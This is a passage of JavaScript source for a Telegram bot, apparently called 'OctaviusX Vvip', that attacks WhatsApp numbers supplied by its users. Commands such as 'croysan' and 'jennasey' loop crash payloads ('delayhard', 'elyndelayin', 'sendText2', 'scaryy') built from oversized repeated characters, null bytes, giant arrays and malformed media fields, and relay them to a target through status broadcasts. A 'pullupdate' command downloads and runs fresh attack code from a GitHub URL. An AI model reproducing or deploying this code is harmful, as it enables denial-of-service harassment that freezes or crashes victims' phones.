      await scaryy(sock, target);
      await sendText2(sock, target);
      await elyndelayin(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Gagal Mengirim")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});


bot.command("croysan", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /intelens 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT HANYA DI PV ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE TETAP DIKIRIM SEMUA CHAT ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " OctaviusX  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
    }
    
    for (let r = 0; r < 5; r++) {
      await scaryy(sock, target);
      await sendText2(sock, target);
      await elyndelayin(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Gagal Mengirim")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});


bot.command("jennasey", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const Icon_satus = HTML.customEmoji("5922612721244704425", "🔄")
  const Icon_ytta = HTML.customEmoji("5913787972200698358", "🤫")
  const Icon_andro = HTML.customEmoji("5316538972594274208", "🤖")
  const Icon_target = HTML.customEmoji("5253959125838090076", "🎯") 
  const Icon_ssc = HTML.customEmoji("5316827280863934685", "⚡")
  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /intelens 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // ============ DRAFT HANYA DI PV ============
  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
    );
  }

  // ============ RICH MESSAGE TETAP DIKIRIM SEMUA CHAT ============
  const richContent = new HTML()
    .slideshow(`<img src="${PHOTOS[0]}"/>`)
    .heading(2, HTML.customEmoji("5897994140502724035", "🕷") + " OctaviusX  Vvip")
    .divider()
    .raw(`
      <table bordered striped>
        <tr><th>Detail</th><th>Informasi</th></tr>
        <tr><td>${Icon_target} Target</td><td>+${q.replace(/[^0-9]/g, "")}</td></tr>
        <tr><td>${Icon_satus} Status</td><td>Sucess Send Bugs ${Icon_ssc}</td></tr>
        <tr><td>${Icon_ytta} Type</td><td>Delay Bebas spam ${Icon_andro}</td></tr>
      </table>
    `)
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: `𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭`, url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "5116414868357907335"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
    }
    
    for (let r = 0; r < 5; r++) {
      await scaryy(sock, target);
      await sendText2(sock, target);
      await delayhard(sock, target);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "❌ Gagal Mengirim")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});


// ============ PULL UPDATE ============
// ============ PULL UPDATE ============
// ============ PULL UPDATE ============
// ============ PULL UPDATE ============
const UPDATE_URL = "https://raw.githubusercontent.com/altasclient-code/OCtaviusX/main/scary.js";
const UPDATE_FILE_PATH = "./scary.js";

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https.get(url, (res) => {
      if (res.statusCode !== 200) {
        file.close(() => fs.unlink(filePath, () => {}));
        return reject(new Error(`HTTP_${res.statusCode}`));
      }

      res.pipe(file);

      file.on("finish", () => file.close(resolve));
    }).on("error", (err) => {
      file.close(() => fs.unlink(filePath, () => {}));
      reject(err);
    });
  });
}

bot.command("pullupdate", async (ctx) => {
  // CEK OWNER
  if (!OWNER_IDS.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner!");
  }

  // PESAN PROSES
  const prosesMsg = new HTML()
    .heading(2, "✨ AUTO UPDATE")
    .divider()
    .table(
      [
        ["Status", "🔎 Installing File..."],
        ["Source", "GitHub Repository"],
        ["Process", "Downloading File"]
      ],
      { bordered: true, striped: true, hasHeader: false }
    )
    .divider()
    .paragraph(
      HTML.bold("⏳ Sedang melakukan sinkronisasi script...") +
      "\n" + HTML.italic("Mohon tunggu beberapa saat.")
    )
    .build();

  await ctx.sendRichMessage(prosesMsg);

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    const successMsg = new HTML()
      .heading(2, "✅ UPDATE SUCCESS")
      .divider()
      .table(
        [
          ["Status", "✅ Completed Download"],
          ["File", "scary.js"],
          ["Source", "GitHub Repository"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("⏳ Script berhasil mendownload file scary.js.") +
        "\n" + HTML.italic("♻️ Automatic Restarting bot...")
      )
      .divider()
      .footer(HTML.italic("OctaviusX  © 2026"))
      .build();

    await ctx.sendRichMessage(successMsg);

    setTimeout(() => process.exit(0), 1500);

  } catch (e) {
    const errorMsg = new HTML()
      .heading(2, "❌ UPDATE FAILED")
      .divider()
      .table(
        [
          ["Status", "❌ Error"],
          ["Action", "Cancelled"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("Sinkronisasi script gagal dilakukan.")
      )
      .pre(String(e.message || e), 'text')
      .build();

    await ctx.sendRichMessage(errorMsg);
  }
});

bot.command("pullupdate", async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner!");
  }

  const thumbnailUp = "https://files.catbox.moe/xd8m5h.jpg";

  // PESAN PROSES PAKE RICH MESSAGE + FOTO
  const prosesMsg = new HTML()
    .photo(thumbnailUp, "📥 Downloading Update...")
    .heading(2, "✨ AUTO UPDATE")
    .divider()
    .table(
      [
        ["Status", "🔎 Installing File..."],
        ["Source", "GitHub Repository"],
        ["Process", "Downloading File"]
      ],
      { bordered: true, striped: true, hasHeader: false }
    )
    .divider()
    .paragraph(
      HTML.bold("⏳ Sedang melakukan sinkronisasi script...") +
      "\n" + HTML.italic("Mohon tunggu beberapa saat.")
    )
    .build();

  await ctx.sendRichMessage(prosesMsg);

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    const successMsg = new HTML()
      .photo(thumbnailUp, "✅ Update Success!")
      .heading(2, "✅ UPDATE SUCCESS")
      .divider()
      .table(
        [
          ["Status", "✅ Completed Download"],
          ["File", "scary.js"],
          ["Source", "GitHub Repository"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("⏳ Script berhasil mendownload file scary.js.") +
        "\n" + HTML.italic("♻️ Automatic Restarting bot...")
      )
      .divider()
      .footer(HTML.italic("OctaviusX © 2026"))
      .build();

    await ctx.sendRichMessage(successMsg);

    setTimeout(() => process.exit(0), 1500);

  } catch (e) {
    const errorMsg = new HTML()
      .photo(thumbnailUp, "❌ Update Failed!")
      .heading(2, "❌ UPDATE FAILED")
      .divider()
      .table(
        [
          ["Status", "❌ Error"],
          ["Action", "Cancelled"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("Sinkronisasi script gagal dilakukan.")
      )
      .pre(String(e.message || e), 'text')
      .build();

    await ctx.sendRichMessage(errorMsg);
  }
});

// TAROK FUNCTION AMPOS LU BY @mkloytiem
async function delayhard(sock, target) {
  for (let p = 0; p < 50; p++) {
    const pm = {
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0&mms3=true",
            fileSha256: "dlob6oYb5Tr671y0M+se6D7DUwViTijFhYc1luOGbTA=",
            mediaKey: "v79wuS5Lfl653TKue0ZwUyHqfYWnUPjFndomy0qTZjM=",
            mimetype: "application/was",
            height: 1280,
            width: 909,
            directPath: "/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0",
            fileLength: "134544",
            mediaKeyTimestamp: "1774806705",
            isAnimated: true,
            stickerSentTs: "1774806705729",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              urlTrackingMap: {
                urlTrackingMapElements: Array.from(
                  { length: 500000 },
                  () => ({ "\0": "\0" })
                )
              }
            }
          }
        }
      }
    };
    await sock.relayMessage("status@broadcast", pm, {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    );
    await sleep(3000);
  }
}

async function elyndelayin(sock, target) {
  try {
    await Promise.allSettled(
      Array(100).fill(null).map(() =>
        sock.relayMessage("status@broadcast", {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/elynn_delaymekk_" + Date.now(),
            mimetype: "image/jpeg",
            caption: "\u202E\u202D\u200F\u200E\u202A\u202B\u202C" + "ꦾ".repeat(100000),
            jpegThumbnail: Buffer.alloc(1024).fill(0xFF),
            fileLength: 999999999,
            height: 9999,
            width: 9999,
            mediaKey: Buffer.alloc(32).fill(0xFF),
            fileEncSha256: Buffer.alloc(32).fill(0xFF),
            fileSha256: Buffer.alloc(32).fill(0xFF),
            directPath: "/v/t62.7118-24/elynn" + "ꦾ".repeat(50000)
          }
        }, {
          statusJidList: [target],
          messageId: "ELYNN-" + Date.now() + "-" + Math.random().toString(36).substr(2, 9)
        })
      )
    );

    return { success: true };
  } catch(e) {
    return { success: false, error: e.message };
  }
}

async function sendText2(sock, target) {
  // GENERATE PESAN DENGAN OVERFLOW
  const textMsg = {
    extendedTextMessage: {
      text: "⸙xɪᴘᴇʀнοω αяє γου?¿" + "ꦾ".repeat(50100) + "\n\nJust INCEPTION" + "\0".repeat(100),
      matchedText: "https://t.me/ziperr2",
      description: "⸙xɪᴘᴇʀ нοω αяє γου?¿",
      title: "ꦽ".repeat(20000),
      previewType: 6,
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
      paymentLinkMetadata: {
        button: { displayText: "Love U My Ayun" },
        header: { headerType: 1 },
        provider: { paramsJson: "{".repeat(10000) }
      },
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        participant: target,
        remoteJid: "status@broadcast",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
        ],
        quotedMessage: {
          newsletterAdminInviteMessage: {
            newsletterJid: "otax@newsletter",
            newsletterName: "⸙xɪᴘᴇʀ нοω αяє γου?¿" + "ꦾ".repeat(10000),
            caption: "⸙xɪᴘᴇʀ нοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
            inviteExpiration: "999999999"
          }
        },
        forwardedNewsletterMessageInfo: {
          newsletterName: "⸙xɪᴘᴇʀ нοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
          newsletterJid: "13135550002@newsletter",
          serverId: 1
        }
      }
    }
  };

  // KIRIM VIA generateWAMessageFromContent
  const msg = await generateWAMessageFromContent(target, textMsg, {});
  
  // RELAY KE STATUS BROADCAST
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });
}

async function scaryy(sock, target) {
  const msg = {
    interactiveMessage: {
      body: {
        text: "𝑆𝑐𝑎𝑟𝑦*"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 50000 }, () => ({}))
      }
    }
  };

  await sock.sendMessage(target, { text: "BY @%ziper" + "Ꮰ}".repeat(1000) });
  await new Promise(r => setTimeout(r, 500));
  await sock.relayMessage(target, msg, { noSelfSync: true });
}

(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

await connectMongoDB();

startSesi();
bot.launch();
})();
